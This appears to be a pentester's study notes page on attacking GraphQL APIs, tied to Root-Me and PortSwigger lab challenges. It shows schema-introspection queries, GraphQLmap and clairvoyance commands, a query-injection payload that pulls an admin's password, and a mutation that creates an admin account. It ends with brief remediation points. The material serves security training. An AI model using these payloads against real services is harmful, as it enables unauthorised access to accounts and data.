<div class="row row-cols-lg-2"><div>

[GraphQL](https://en.wikipedia.org/wiki/GraphQL) (Graph Query Language) is an open-source query language for APIs. It's used by GitHub, Shopify, and Facebook internally.

* [GraphQL Documentation](https://graphql.org/) <small>(‚õ™)</small>
* [GitHub](https://github.com/graphql/graphql-js) <small>(20.2k ‚≠ê)</small>

It was designed to provide a more efficient, powerful, and flexible alternative to traditional REST APIs. It solves a problem of REST APIs which is under- and over-fetching.

```graphql
query{__typename} 
```

Look into the JavaScript Source Code and you may find if it's used.
</div><div>

 To query the `id,username` of the `user` with `id=123`:
```graphql
query {
  # if available, list all users as "users"
  users: user { id, username }
  # query one user
  user(id: 123) {
    id
    username
  }
}
```

There is only one endpoint. We can perform multiple queries in one request. Look for: `/api/graphql`, `/graphql`, `/graphiql`, etc.

[GraphQLMap](https://github.com/swisskyrepo/GraphQLmap) <small>(1.4k ‚≠ê, 2023 ü™¶)</small> was developed by the owner of PayloadsAllTheThings. It allows us to send GraphQL queries to an endpoint rather easily. It also provide a few utilities.

```shell!
$ pipx install git+https://github.com/swisskyrepo/GraphQLmap
$ pipx runpip graphqlmap install requests
$ graphqlmap -h.1
```

It can dump the schema and present it in a nice representation.
</div><div>

A basic usage:

```shell!
$ graphqlmap -u 'https://example.com/api/graphql' --headers '{"Authorization": "Bearer ..."}' --method POST
prompt> query { account(username: "admin") { id, username, password } }
```

## Introspection üó∫Ô∏è

[![graphql_introspection](../../../../cybersecurity/_badges/rootme/web_server/graphql_introspection.svg)](https://www.root-me.org/en/Challenges/Web-Server/GraphQL-Introspection)
[![graphql_unprotected](../../../../cybersecurity/_badges/ps-lab/graphql/graphql_unprotected.svg)](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)
[![graphql_simple_bypass](../../../../cybersecurity/_badges/ps-lab/graphql/graphql_simple_bypass.svg)](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)
[![hidden_graphql_endpoint](../../../../cybersecurity/_badges/ps-lab/graphql/hidden_graphql_endpoint.svg)](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)

Introspection refer to dumping the API schema. It's often disabled in production.

<div class="row row-cols-lg-2"><div>

#### Introspection ‚Äî Manual Queries

Each object has a type. Each type has attributes. The type may have a constructor with arguments that are required to query an object.

```text!
{__schema{types{name}}}
{__schema{types{name,fields{name}}}}
{__schema{types{name,fields{name},description}}}
{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```

After identifying the types and their arguments, we can query them:

```text!
{MyType{field1, field2}}
{MyType(arg:value){field1, field2}}
```

‚û°Ô∏è When errors are enabled, you can receive suggestions from GraphQL like a type or attribute name that is similar to your input.

#### Introspection ‚Äî Graphical WebUI

[GraphQL Voyager](https://graphql-kit.com/graphql-voyager/) <small>(7.7k ‚≠ê)</small> can take the input from your introspection query or from tools such as [clairvoyance](#introspection--clairvoyance) and display it as a graph.

<br>

#### Introspection ‚Äî clairvoyance

[clairvoyance](https://github.com/nikitastupin/clairvoyance) <small>(1.1k ‚≠ê)</small> can be used to dump the schema:

```shell!
$ pipx install git+https://github.com/nikitastupin/clairvoyance
$ clairvoyance 'https://example.com/api/graphql' -o schema.json
```

</div></div>

## GraphQL Injections

<div class="row row-cols-lg-2"><div>

#### GraphQL Query Injection

[![graphql_injection](../../../../cybersecurity/_badges/rootme/web_server/graphql_injection.svg)](https://www.root-me.org/en/Challenges/Web-Server/GraphQL-Injection)
[![graphql_mutation](../../../../cybersecurity/_badges/rootme/web_server/graphql_mutation.svg)](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Mutation)

Much like SQL, you can manipulate a query if user input is added directly to the query without any sanitization.

```graphql
query {
  product(name: "$prodname") {
    id
    name
    description
  }
}
```

The normal expected input would be:

```js!
prodname = "toy"
```

But a malicious user could use the code below. We use `#` to avoid handling the rest of the request.

```js!
username = 'toy"){\nid\n}\naccount(username:"admin"){\nid,username,password\n}#'
```

Another alternative would be to close the `query{` by using `\n}`.

## GraphQL Mutation Queries

[![graphql_mutation](../../../../cybersecurity/_badges/rootme/web_server/graphql_mutation.svg)](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Mutation)

<div class="row row-cols-lg-2"><div>

When introspecting the database, we may find mutations. They are functions allowing us to add/edit the database.

```text!
createAccount[]: id (Int!), username (String!), password (String!)
```

You can invoke it as follows:

```graphql
mutation {
  createAccount(id: 5, username: "admin", password: "abc") { id, username }
}
```
</div><div>

The main issues are:

* üìö Creating records to bypass access control <small>(role=admin)</small>
* ü™¶ Creating records to perform an attack such as XSS
* üí¶ Updating records to bypass access control <small>(role=admin)</small>
* üí• Creating/Updating records to exploit references and access unintended objects. For instance, if we were blocked access to B, but we can create an object A that is referencing an object B, then by querying A, we may be able to access B.

```graphql
query { notes { id, flag } } # blocked
query { post(id: 1) { id, notes { id, flag } } } # OK
```
</div></div>

#### GraphQL Bypasses

[![graphql_simple_bypass](../../../../cybersecurity/_badges/ps-lab/graphql/graphql_simple_bypass.svg)](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)
[![hidden_graphql_endpoint](../../../../cybersecurity/_badges/ps-lab/graphql/hidden_graphql_endpoint.svg)](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)

This is no known working bypasses but only edge bypasses:

* Try method and content-type swapping with URL bypasses
* Try randomly insert newlines
</div><div>

#### GraphQL In Burp Suite

GraphQL is integrated within Burp. When using right-click from the repeater with an introspection query, we can use "add to the sitemap" to automatically map the schema to URLs with their parameters.

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [How to exploit GraphQL endpoint: introspection, query, mutations & tools](https://www.yeswehack.com/learn-bug-bounty/how-exploit-graphql-endpoint-bug-bounty)
* [pentest101](https://escape.tech/blog/pentest101/)
* [inigo](https://inigo.io/blog/graphql_injection_attacks)
* InQL
</div><div>

Remediation

* RateLimit alone is not very useful as multiple queries in one request
* SizeLimit should be enforced to block long requests
* Access Control should be implemented (ex: JWT)
* The server should validate types and values
